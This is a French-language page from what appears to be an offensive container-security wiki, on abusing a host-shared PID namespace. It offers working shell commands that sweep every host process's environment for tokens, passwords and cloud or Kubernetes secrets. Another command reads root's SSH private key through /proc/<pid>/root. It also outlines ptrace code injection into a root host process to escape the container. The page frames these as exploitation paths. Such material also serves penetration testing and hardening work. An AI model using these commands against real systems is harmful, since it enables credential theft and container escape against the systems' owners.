---
title: "Espace de noms PID de l'hôte : opérer sur les processus de l'hôte depuis le conteneur"
order: 1
description: "Un conteneur qui partage l'espace de noms PID de l'hôte voit chaque processus de l'hôte dans son propre /proc. Cela expose les lignes de commande, les variables d'environnement, les descripteurs de fichiers ouverts et les racines de processus de l'hôte pour la collecte de secrets et, combiné à la permission ptrace, permet d'injecter du code dans un processus de l'hôte détenu par root afin de s'exécuter sur l'hôte."
keywords:
  - hostpid
  - espace de noms pid
  - injection de processus
  - proc environ
  - évasion de conteneur
---

# Espace de noms PID de l'hôte

Avec `--pid=host` ou `hostPID: true`, l'espace de noms PID du conteneur est celui de l'hôte, de sorte que `/proc` liste chaque processus de l'hôte. Cela a deux conséquences : toutes les métadonnées des processus de l'hôte deviennent lisibles et, là où ptrace est permis, les processus de l'hôte deviennent des cibles d'injection. La première est un gain quasi garanti de collecte de secrets ; la seconde est une évasion complète lorsqu'une capacité ou un UID correspondant permet d'écrire dans la mémoire d'un autre processus.

Confirmez l'espace de noms partagé :

```bash
readlink /proc/1/exe                        # host init path => host PID namespace
ls /proc | grep -E '^[0-9]+$' | wc -l       # host-wide process count
ps -ef | grep -vE '\]$' | head              # real host daemons listed
```

## Voies

```bash
# Harvest secrets from host process environments and command lines
for p in /proc/[0-9]*; do tr '\0' '\n' < $p/environ 2>/dev/null; done | \
  grep -iE 'token|secret|key|pass|aws|kube' | sort -u

# Reach another process's filesystem via its root symlink
cat /proc/<root_pid>/root/root/.ssh/id_ed25519 2>/dev/null

# Inject into a root host process (needs ptrace permission / CAP_SYS_PTRACE)
# seize -> overwrite code at rip via /proc/<pid>/mem -> detach to run shellcode
```

Le seul balayage des variables d'environnement renvoie fréquemment des identifiants cloud, des mots de passe de bases de données et des jetons de compte de service qui permettent de pivoter vers l'hôte ou le cluster sans aucune autre évasion.

## Notes d'exploitation

- Lire `environ`, `cmdline`, `fd` et `root` des processus de l'hôte ne nécessite que la visibilité et, pour les autres UID, un privilège suffisant ; c'est une divulgation d'informations à faible bruit.
- L'injection de code dans un processus de l'hôte nécessite en outre la permission ptrace ; associez avec [CAP_SYS_PTRACE](../privileged-configuration/capability-abuse/cap-sys-ptrace.md). La mécanique est la même que la voie d'injection ptrace, rendue possible ici par la visibilité des processus de l'hôte.
- Dans Kubernetes, les pods `hostPID` s'exécutent couramment aux côtés de démons du nœud dont la mémoire et l'environnement détiennent des identifiants kubelet ou cloud ; voir [Espaces de noms de l'hôte](../../orchestration/kubernetes/pod-escape-to-node/host-namespaces.md).

## Références

- [man 7 pid_namespaces](https://man7.org/linux/man-pages/man7/pid_namespaces.7.html)
- [HackTricks : PID namespace](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/namespaces/pid-namespace)
